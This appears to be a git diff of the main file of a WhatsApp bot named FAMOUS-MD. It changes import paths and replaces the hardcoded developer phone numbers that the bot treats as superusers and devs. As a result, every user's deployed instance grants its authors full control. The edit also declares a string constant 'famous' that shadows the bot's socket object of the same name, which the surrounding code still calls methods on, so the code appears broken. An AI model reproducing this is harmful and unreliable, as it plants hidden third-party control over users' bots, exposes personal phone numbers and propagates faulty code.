@@ -39,15 +39,15 @@ let path = require("path");
 const FileType = require('file-type');
 const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
 //import chalk from 'chalk'
-const { verifierEtatJid, recupererActionJid } = require("./bdd/antilien");
-const { atbverifierEtatJid, atbrecupererActionJid } = require("./bdd/antibot");
+const { verifierEtatJid, recupererActionJid } = require("./fonctions/antilien");
+const { atbverifierEtatJid, atbrecupererActionJid } = require("./fonctions/antibot");
 let evt = require(__dirname + "/framework/famous");
-const { isUserBanned, addUserToBanList, removeUserFromBanList } = require("./bdd/banUser");
-const { addGroupToBanList, isGroupBanned, removeGroupFromBanList } = require("./bdd/banGroup");
-const { isGroupOnlyAdmin, addGroupToOnlyAdminList, removeGroupFromOnlyAdminList } = require("./bdd/onlyAdmin");
+const { isUserBanned, addUserToBanList, removeUserFromBanList } = require("./fonctions/banUser");
+const { addGroupToBanList, isGroupBanned, removeGroupFromBanList } = require("./fonctions/banGroup");
+const { isGroupOnlyAdmin, addGroupToOnlyAdminList, removeGroupFromOnlyAdminList } = require("./fonctions/onlyAdmin");
 //const { constrainedMemory } = require("process");
 //const { co } = require("translatte/languages");
-const { recupevents } = require('./bdd/welcome');
+const { recupevents } = require('./fonctions/welcome');
 //const //{loadCmd}=require("/framework/mesfonctions")
 let { reagir } = require(__dirname + "/framework/app");
 var session = conf.session.replace(/FAMOUS-MD;;;=>/g, "");
@@ -132,17 +132,11 @@ setTimeout(() => {
             var origineMessage = ms.key.remoteJid;
             var idBot = decodeJid(famous.user.id);
             var servBot = idBot.split('@')[0];
-            /* const dj='50943782508';
-             const dj2='50943782508';
-             const luffy='50943782508'*/
-            /*  var superUser=[servBot,dj,dj2,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
-              var dev =[dj,dj2,luffy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
             const verifGroupe = origineMessage?.endsWith("@g.us");
             var infosGroupe = verifGroupe ? await famous.groupMetadata(origineMessage) : "";
             var nomGroupe = verifGroupe ? infosGroupe.subject : "";
             var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
             var auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
-            //ms.message.extendedTextMessage?.contextInfo?.mentionedJid
             // ms.message.extendedTextMessage?.contextInfo?.quotedMessage.
             var mr = ms.message?.extendedTextMessage?.contextInfo?.mentionedJid;
             var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
@@ -152,19 +146,17 @@ setTimeout(() => {
             }
 
             var membreGroupe = verifGroupe ? ms.key.participant : '';
-            const { getAllSudoNumbers } = require("./bdd/sudo");
+            const { getAllSudoNumbers } = require("./fonctions/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '50943782508';
-            const dj2 = '50943782508';
-            const dj3 = "50943782508";
-            const luffy = '50943782508';
-            const dj4 = '50943782508';
+            const dyby = '50943782508';
+            const famous = '50943782508';
+            const famoustechprivate = '50944156629';
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, dj, dj2, dj3, dj4, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, dyby, famoustechprivate, famous, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
 
-            var dev = [dj, dj2, dj3, dj4, luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var dev = [dyby,famous,famoustechprivate].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { famous.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
             console.log("\t [][]...{FAMOUS-MD}...[][]");
             console.log("=========== Nouveau message ===========");
